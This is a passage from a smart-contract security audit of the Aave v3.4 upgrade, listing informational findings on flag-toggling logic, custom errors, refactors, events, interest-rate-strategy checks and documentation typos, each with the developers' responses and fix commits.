As already documented by BGD, there have been cases where the "use-as-collateral" flag was `true` even if the balance of the user was empty (because of rounding errors or logic not covering edge cases scenarios).

If the user (or PM) tries to turn off the flag and the balance is zero, the validation logic should not revert. Further sanity checks on the user's HF will be anyway performed by the `SupplyLogic.executeUseReserveAsCollateral` down the flow. Allowing such a scenario could allow the user (or the PM) to restore the "correct" state of the user's config flag for such `asset`.

## Recommendations

BGD should consider not revert if the user is trying to turn off the "use-as-collateral" flag even if the balance is zero.

**StErMi:** the recommendations have been implemented in the commit [`c3a78ab84687a1b06cf754c18f9dc7175d3afc73`](https://github.com/aave-dao/aave-v3-origin/commit/c3a78ab84687a1b06cf754c18f9dc7175d3afc73)

# [I-07] The logic to toggle "use-as-collateral" and "is-borrowing" flags should be unified across all the codebase and based on the user scaled balance

## Context

`setUsingAsCollateral` instances:

- [BorrowLogic.sol#L189-L192](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/BorrowLogic.sol#L189-L192)
- [LiquidationLogic.sol#L109-L112](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/LiquidationLogic.sol#L109-L112)
- [LiquidationLogic.sol#L314-L326](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/LiquidationLogic.sol#L314-L326)
- [LiquidationLogic.sol#L473-L492](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/LiquidationLogic.sol#L473-L492)
- [SupplyLogic.sol#L71-L84](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/SupplyLogic.sol#L71-L84)
- [SupplyLogic.sol#L143-L145](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/SupplyLogic.sol#L143-L145)
- [SupplyLogic.sol#L214-L216](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/SupplyLogic.sol#L214-L216)
- [SupplyLogic.sol#L219-L232](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/SupplyLogic.sol#L219-L232)
- [SupplyLogic.sol#L253-L300](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/SupplyLogic.sol#L253-L300)

`setBorrowing` instances:

- [BorrowLogic.sol#L75-L78](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/BorrowLogic.sol#L75-L78)
- [BorrowLogic.sol#L169-L171](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/BorrowLogic.sol#L169-L171)
- [LiquidationLogic.sol#L538-L540](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/LiquidationLogic.sol#L538-L540)

## Description

Not all the existing logic already relies on the user's scaled balance (and the existing value of the "use-as-collateral" and "is-borrowing") to toggle to `true`/`false` flag.

The change could be intrusive (because it needs to be done **after** the mint/burn/transfer of the tokens) but it would provide a common logic applied across all the codebase, reducing or removing at all possible unexpected behavior.

## Recommendations

BGD should consider to always using the scaled balance of the user (and the current value of the flag) to turn on/off both the "use-as-collateral" and "is-borrowing" flags, like some of the existing logic is already doing.

**BGD:** For 3.4 this was to big of a change, but we'll consider in upcoming releases.

# [I-08] Consider adding inputs to the new defined custom errors

## Context

- [Errors.sol](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/helpers/Errors.sol)

## Description

With v3.4 BGD has introduced the usage of custom errors to improve the DX and UX. To even further improve the DX and UX, they should consider adding inputs to the custom error where they are needed.

## Recommendations

Consider adding support for arbitrary inputs to the new defined custom errors where it's needed to further improve the DX and UX.

**BGD:** ack, won't fix

We'll consider refining the errors in upcoming upgrades, but the initial goal was to only do the migration from error strings to Errors, without altering the content of the errors.

# [I-09] Bulk informational changes/refactor/suggestions

## Description

- [x] Removal of unused imports: during the review of the protocol codebase, there were multiple instances of "unused imports" that should be removed. For example: `IAaveIncentivesController` can be removed from [VariableDebtTokenInstance.sol#L4](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/instances/VariableDebtTokenInstance.sol#L4)
- [x] [BorrowLogic.sol#L125](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/BorrowLogic.sol#L125): consider renaming in `executeRepay` the input parameter `userConfig` to `onBehalfOfConfig`. This represents the configuration of the user whom the debt is repaid of.
- [ ] [LiquidationLogic.sol#L70-L132](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/LiquidationLogic.sol#L70-L132): the `executeEliminateDeficit` function can only be executed by `UMBRELLA`. Consider renaming the input parameters and variables from `user*` to `umbrella*` to align with the best practice already adopted within the other code of the liquidation logic.
- [x] [PoolLogic.sol#L85](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/PoolLogic.sol#L85): consider replacing the ` ReserveLogic.updateInterestRatesAndVirtualBalance(reserve, ...)` call to `reserve.updateInterestRatesAndVirtualBalance` as already adopted in other part of the code
- [ ] [PoolLogic.sol](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/PoolLogic.sol): consider refactoring part of the `PoolLogic` contract and align all (where needed) function's input parameters to always accept the same signature. Some of them will require `mapping(address => DataTypes.ReserveData) storage reservesData` as an input, some instead directly the `DataTypes.ReserveData storage reserve`
- [ ] [DataTypes.sol#L313](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/types/DataTypes.sol#L313): consider renaming the `unbacked` attribute to `deficit`.
- [ ] [DataTypes.sol#L319-L320](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/types/DataTypes.sol#L319-L320): consider removing the `usingVirtualBalance` attribute, which is not used anymore by `DefaultReserveInterestRateStrategyV2`
- [x] [ValidationLogic.sol#L350-L404](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/ValidationLogic.sol#L350-L404): consider renaming the `userConfig` input parameter to `borrowerConfig` to align with the changes already made in `LiquidationLogic.executeLiquidationCall`
- [x] [Pool.sol](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/pool/Pool.sol): consider storing the `_msgSender();` value in a local variable and use it as the input parameter of the logic functions, as already done by the `setUserUseReserveAsCollateral` function. This best practice should be applied across the codebase.
- [x] Multiple contract files are still using `pragma solidity ^0.8.0;` while the vast majority of the codebase has been upgraded to `pragma solidity ^0.8.10;`. When possible, upgrade the pragma declaration to `pragma solidity ^0.8.10;` to be fully aligned.
- [x] [BaseDelegation.sol#L169](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/tokenization/delegation/BaseDelegation.sol#L169) + [BaseDelegation.sol#L194](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/tokenization/delegation/BaseDelegation.sol#L194) + [DebtTokenBase.sol#L65](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/tokenization/base/DebtTokenBase.sol#L65) + [AToken.sol#L155](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/tokenization/AToken.sol#L155): consider using OpenZeppelin `ECDSA.recover` instead of the native `ecrecover` function to cover possible edge cases (like signature malleability)

## Recommendations

BGD should consider fixing all the above listed suggestions.

**StErMi:** part of the recommendations have been implemented in the commit [`6700bd912b8c350ea8f477af8a3dedb2b9f55691`](https://github.com/aave-dao/aave-v3-origin/commit/6700bd912b8c350ea8f477af8a3dedb2b9f55691), [`57e7d73e15a4e389d1c8f3dd1f93be0d318b317c`](https://github.com/aave-dao/aave-v3-origin/commit/57e7d73e15a4e389d1c8f3dd1f93be0d318b317c) and [`7a22e88fd672ebe9a43599717848a2f1f7bed2db`](https://github.com/aave-dao/aave-v3-origin/commit/7a22e88fd672ebe9a43599717848a2f1f7bed2db). The remaining have been acknowledged or won't be implemented with the following statement from BGD:

> 3: ack, won't fix as it does not relate to the upgrade, but adds additional noise
> 5: ack, won't fix as it does not relate to the upgrade, but adds additional noise
> 6: ack, won't fix as it does not relate to the upgrade, but adds additional noise
> 7: this would be a breaking change, which should be avoided
> 9: ack, but aligned it the other way around
> 10: partially ack, for interfaces as commented on the review, we think it makes no sense and might even be bad for external integrators. On the contracts we implemented the suggestion though.

# [I-10] `BalanceTransfer` event should be moved back to the `IAToken` interface

## Context

- [IScaledBalanceToken.sol#L10-L17](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/interfaces/IScaledBalanceToken.sol#L10-L17)

## Description

The `BalanceTransfer` event has been moved from the `IAToken` interface to the `IScaledBalanceToken` interface. The `IScaledBalanceToken` interface is in common between the `AToken` and `VariableDebtToken` but the `BalanceTransfer` event is unique to the `AToken` logic, given that debt cannot be transferred from a borrower to another.

## Recommendations

BGD should move back the `BalanceTransfer` event into the `IAToken` interface.

**StErMi:** The recommendations have been implemented in the commit [`6700bd912b8c350ea8f477af8a3dedb2b9f55691`](https://github.com/aave-dao/aave-v3-origin/commit/6700bd912b8c350ea8f477af8a3dedb2b9f55691) and [`57e7d73e15a4e389d1c8f3dd1f93be0d318b317c`](https://github.com/aave-dao/aave-v3-origin/commit/57e7d73e15a4e389d1c8f3dd1f93be0d318b317c)

# [I-11] Consider triggering `ReserveInterestRateStrategyChanged` when `PoolInstance.initialize` is executed

## Context

- [PoolInstance.sol#L25](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/instances/PoolInstance.sol#L25)

## Description

The IRS has been moved to the `address public immutable RESERVE_INTEREST_RATE_STRATEGY;` and it's not stored in the reserve's config anymore.

For that reason, the `PoolConfigurator.setReserveInterestRateStrategyAddress` function has been removed and the `ReserveInterestRateStrategyChanged` event is not triggered anymore.

Even if the IRS address has not changed during the upgrade, you should consider triggering this event anyway (updating your dApp/monitoring tools logic).

## Recommendations

BGD should consider triggering the `ReserveInterestRateStrategyChanged` event when `PoolInstance.initialize` is executed. Another possible place to trigger the event could be inside the deployment script when needed.

**BGD:** ack, won't fix

The event needs to be emitted from `PoolConfigurator` if it ever changes. We will work on a solution ad-hoc in that case.

# [I-12] `PoolInstance` should verify that the new `RESERVE_INTEREST_RATE_STRATEGY` is configured for the existing reserves

## Context

- [PoolInstance.sol#L25](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/instances/PoolInstance.sol#L25)

## Description

With the v3.4 upgrade, the Interest Rate Strategy address has been moved from the reserve's config to the `Pool` contract as an immutable state variable initialized during the deployment of the `Pool` implementation contract.

The value of `Pool.RESERVE_INTEREST_RATE_STRATEGY` could be different from the one previously used in the reserve's config and could also be different from the previous implementation of the `Pool` contract (in a future upgrade to v3.5, v3.6 and so on).

During the execution of `Pool.initialize`, BGD should ensure that the existing IRS is compatible with the reserves configured inside the pool itself. They should iterate the reserves and verify that they have been properly configured inside the IRS.

## Recommendations

BGD should verify that the `Pool.RESERVE_INTEREST_RATE_STRATEGY` has been configured for every existing reserves when the `Pool.initialize` function is executed.

**BGD:** Ack.

We test this on the upgrade, we will not do it on the initialize, as it's not possible to do in a reasonable way right now.
We'll reconsider in a future upgrade.

# [I-13] `AaveProtocolDataProvider` is assuming that the immutable `POOL` address cannot change in `PoolAddressesProvider`

## Context

- [AaveProtocolDataProvider.sol#L41-L44](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/helpers/AaveProtocolDataProvider.sol#L41-L44)

## Description

In the new implementation of the `AaveProtocolDataProvider` contract, the `POOL` address/contract is defined as `immutable` and not fetched any more on-demand each time it's needed.

The "problem" with this approach is that it assumes that the `pool` address on the `PoolAddressesProvider` is also `immutable` which is false.
It can be changed by calling `PoolAddressesProvider.setAddress(PoolAddressesProvider.POOL, newPoolAddress)`. It's maybe unlikely, but it's still possible and if it happens BGD would need to re-deploy a new `AaveProtocolDataProvider` contract and update the reference in the `PoolAddressesProvider` by calling `setAddress(DATA_PROVIDER, newAAVEPoolDataProvider)`

## Recommendations

BGD should document this new behavior or revert to the previous implementation, which was less gas optimized but was not prone to this issue.

**StErMi:** the recommendations have been implemented in the commit [`6700bd912b8c350ea8f477af8a3dedb2b9f55691`](https://github.com/aave-dao/aave-v3-origin/commit/6700bd912b8c350ea8f477af8a3dedb2b9f55691) and [`57e7d73e15a4e389d1c8f3dd1f93be0d318b317c`](https://github.com/aave-dao/aave-v3-origin/commit/57e7d73e15a4e389d1c8f3dd1f93be0d318b317c)

# [I-14] Typos or missing documentation in natspec

## Description

- [x] [Aave-v3.4-features.md?plain=1](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/docs/3.4/Aave-v3.4-features.md?plain=1): review the whole `README` file to wrap every variable name or "technical word" (like ERC20) with the Markdown "code" tag "`"
- [x] [Aave-v3.4-features.md?plain=1#L116](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/docs/3.4/Aave-v3.4-features.md?plain=1#L116): the Markdown syntax for the `UNI aToken` is inverted.
- [x] [Aave-v3.4-features.md?plain=1#L121](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/docs/3.4/Aave-v3.4-features.md?plain=1#L121): typo, replace `uin256` with `uint256`
- [x] [Aave-v3.4-features.md?plain=1#L159](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/docs/3.4/Aave-v3.4-features.md?plain=1#L159): `getIsVirtualAccActive` is missing the closing "`" Markdown text
- [x] [Aave-v3.4-features.md?plain=1#L200](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/docs/3.4/Aave-v3.4-features.md?plain=1#L200): typo, replace "both he aToken" with "both the `aToken`"
- [x] [AaveProtocolDataProvider.sol#L178](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/helpers/AaveProtocolDataProvider.sol#L178): In `AaveProtocolDataProvider.getReserveData` consider documenting why the `unbacked` return value is hardcoded as `0` like you have already done for the stable rate values.
- [x] [ATokenInstance.sol](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/instances/ATokenInstance.sol): consider covering the `contract` definition with natspec documentation
- [x] [ATokenWithDelegationInstance.sol](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/instances/ATokenWithDelegationInstance.sol): consider covering the `contract` definition with natspec documentation
- [x] [L2PoolInstance.sol](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/instances/L2PoolInstance.sol): consider covering the `contract` definition with natspec documentation
- [x] [PoolConfiguratorInstance.sol](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/instances/PoolConfiguratorInstance.sol): consider covering the `contract` definition with natspec documentation
- [x] [PoolInstance.sol](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/instances/PoolInstance.sol): consider covering the `contract` definition with natspec documentation
- [x] [VariableDebtTokenInstance.sol](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/instances/VariableDebtTokenInstance.sol): consider covering the `contract` definition with natspec documentation
- [x] [IPool.sol#L745](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/interfaces/IPool.sol#L745): now that there's no `GHO` you can re-write it in one line without the `-` bullet point.
- [x] [IPool.sol#L752-L758](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/interfaces/IPool.sol#L752-L758): the `approvePositionManager` natspec comment is incorrect. The position manager won't be able to call `setUserUseReserveAsCollateral` or `setUserEMode`. If they call it, they will call for themselves and not on behalf of someone else. The position manager will be able to call `setUserUseReserveAsCollateralOnBehalfOf` and `setUserEModeOnBehalfOf`.
- [x] [IPool.sol#L786](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/interfaces/IPool.sol#L786): consider rephrasing the `isApprovedPositionManager` notice comment. The current text uses the `user` term with a different meaning in the very same phrase.
- [x] [IPoolDataProvider.sol#L107-L112](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/interfaces/IPoolDataProvider.sol#L107-L112): the `getUnbackedMintCap` natspec is left unchanged and not removed. The implementation of such a function now returns directly the hardcoded value `0`. Consider adding a deprecation comment or fully removing the function.
- [x] [IPoolDataProvider.sol#L247](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/interfaces/IPoolDataProvider.sol#L247): consider rephrasing the "all reserves are active" natspec. The "active" flag of a reserve is about the reserve config flag. In this case, you are talking about the "virtual acc active" flag, which is a different flag.
- [x] [IVariableDebtToken.sol#L36](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/interfaces/IVariableDebtToken.sol#L36): add the context "current" (or "new") to the `burn` natspec → "if the current balance is zero"
- [x] [ReserveConfiguration.sol#L472](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/configuration/ReserveConfiguration.sol#L472): consider updating the natsepc documentation of the `setVirtualAccActive` to reflect the logic's change. Now, the function forcefully set the value of the flag to `true`.
- [x] [LiquidationLogic.sol#L71-L72](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/LiquidationLogic.sol#L71-L72): The `GHO` scenario does not exist anymore, you can inline this comment without any bullet point markdown style
- [x] [PoolLogic.sol#L72-L78](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/PoolLogic.sol#L72-L78): the `executeSyncRatesState` notice natspec is wrong, and probably it's a copy/paste from the one used for the `executeSyncIndexesState` function. The correct one is: "Updates interest rates on the reserve data".
- [x] [PoolLogic.sol#L72-L93](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/PoolLogic.sol#L72-L93): rename the input parameter (and everything related to it) to `interestRateStrategyAddress`. This name is already widely used across the whole codebase
- [x] [ValidationLogic.sol#L262](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/ValidationLogic.sol#L262): replace `uint(-1)` with `type(uint256).max`
- [x] [ValidationLogic.sol#L263](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/ValidationLogic.sol#L263): the `onBehalfOf` natspec comment must be rewritten. Suggestion: "the `user` sender" instead of "the user the sender"
- [x] [DataTypes.sol#L68-L69](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/types/DataTypes.sol#L68-L69): consider adding the comment "should use the `RESERVE_INTEREST_RATE_STRATEGY` variable from the Pool contract"
- [x] [DataTypes.sol#L102](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/types/DataTypes.sol#L102): consider documenting the new behavior of the virtual accounting slot in the `ReserveConfigurationMap` struct:
  - all the existing reserves, excluding `GHO`, will have it set to `1` (`true`)
  - all the new created reserves will have it forcefully set to `1` (`true`)
  - document the specific behavior of `GHO`. It will be equal to `0` (`false`). As far as I can see, it's never "directly" returned by getters.
- [x] [Pool.sol#L65-L68](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/pool/Pool.sol#L65-L68): add the natspec documentation to the `onlyPositionManager` modifier like you have already done for all the other modifiers
- [x] [Errors.sol#L98](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/helpers/Errors.sol#L98): consider rephrasing the comment: "Thrown when the caller has not been enabled as a position manager of the on-behalf-of user"

## Recommendations

BGD should fix all the issues listed in the above section

**StErMi:** The recommendations have been implemented in the commit [`6700bd912b8c350ea8f477af8a3dedb2b9f55691`](https://github.com/aave-dao/aave-v3-origin/commit/6700bd912b8c350ea8f477af8a3dedb2b9f55691) and [`57e7d73e15a4e389d1c8f3dd1f93be0d318b317c`](https://github.com/aave-dao/aave-v3-origin/commit/57e7d73e15a4e389d1c8f3dd1f93be0d318b317c)
